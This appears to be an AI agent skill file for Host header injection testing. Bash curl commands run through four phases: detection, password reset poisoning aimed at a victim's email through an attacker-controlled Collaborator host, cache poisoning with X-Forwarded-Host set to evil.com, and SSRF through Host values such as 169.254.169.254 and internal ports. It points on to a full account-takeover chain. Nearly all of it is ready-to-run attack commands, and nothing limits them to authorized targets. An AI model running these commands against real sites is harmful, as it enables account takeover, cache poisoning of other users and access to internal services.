---
name: vuln-host-header
description: "Host header injection testing — password reset poisoning, cache poisoning via Host, SSRF via Host header, routing bypass, virtual host confusion, port-based bypass. Triggers: 'host header injection', 'host header attack', 'host header poisoning', 'password reset poisoning host', 'cache poisoning host header', 'x-forwarded-host', 'x-host injection'."
---

# Host Header Injection Testing

Manipulate Host header to poison password resets, poison caches, and bypass routing.

---

## Phase 1: Detection

```bash
TARGET="https://TARGET"
COLLAB="BURP_COLLABORATOR_HOST"

curl -s -H "Host: evil.com" "$TARGET/" | head -20

curl -s -H "Host: target.com" -H "X-Forwarded-Host: evil.com" "$TARGET/" | head -20

curl -s -H "Host: CANARY.evil.com" "$TARGET/" | grep -i "CANARY"

curl -s -X POST "$TARGET/api/password-reset" \
  -H "Host: $COLLAB" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'

HEADERS=("X-Forwarded-Host" "X-Host" "X-Forwarded-Server" "X-HTTP-Host-Override" "Forwarded")
for H in "${HEADERS[@]}"; do
  RESP=$(curl -s -H "$H: evil.com" "$TARGET/password-reset" -X POST \
    -d 'email=test@test.com' 2>/dev/null | grep -i "evil.com")
  [ -n "$RESP" ] && echo "$H: REFLECTED"
done | tee output/host_header_detect.txt
```

---

## Phase 2: Password Reset Poisoning

```bash
TARGET="https://TARGET"
COLLAB="BURP_COLLABORATOR_HOST"

curl -s -X POST "$TARGET/api/password/reset" \
  -H "Host: $COLLAB" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'

curl -s -X POST "$TARGET/api/password/reset" \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: $COLLAB" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'

```

---

## Phase 3: Cache Poisoning via Host

```bash
TARGET="https://TARGET"

curl -s -H "Host: target.com" \
  -H "X-Forwarded-Host: evil.com" \
  "$TARGET/" | grep "evil.com"

curl -s -H "X-Forwarded-Host: evil.com" "$TARGET/static/app.js"

curl -s -I "$TARGET/" | grep -i "vary:"
```

---

## Phase 4: SSRF via Host Header

```bash
TARGET="https://TARGET"

curl -s -H "Host: 169.254.169.254" "$TARGET/"
curl -s -H "Host: localhost" "$TARGET/"
curl -s -H "Host: 10.0.0.1" "$TARGET/"

curl -s -H "Host: localhost:8080" "$TARGET/"
curl -s -H "Host: 127.0.0.1:9200" "$TARGET/"  # Elasticsearch
```

---

## Output

Save to `output/`:
- `host_header_detect.txt` — headers that cause reflection
- `host_header_poc.txt` — password reset URL with attacker domain

## Next Phase

→ `vuln-password-reset-poisoning` for full ATO chain
→ `vuln-cache-deception` for cache poisoning steps
